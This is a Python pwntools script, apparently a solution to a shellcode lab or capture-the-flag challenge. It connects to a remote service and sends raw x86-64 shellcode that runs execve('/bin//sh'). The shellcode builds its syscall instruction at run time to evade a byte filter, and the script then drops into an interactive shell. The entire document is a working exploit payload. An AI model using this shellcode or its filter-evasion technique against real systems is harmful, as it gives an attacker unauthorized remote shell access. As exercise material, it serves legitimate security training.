from pwn import *

local = False
elf = 'shellc0de.c' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "sqlab.zongyuan.nctu.me"
    port = 6004
    r = remote(ip,port)

context.arch = 'amd64'

payload = "\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xB0\x3B\x48\x31\xC9\x66\xB9\x0E\x04\x66\x81\xC1\x01\x01\x66\x51\x49\x89\xE2\x41\xFF\xE2"

r.sendline(payload)
r.interactive()


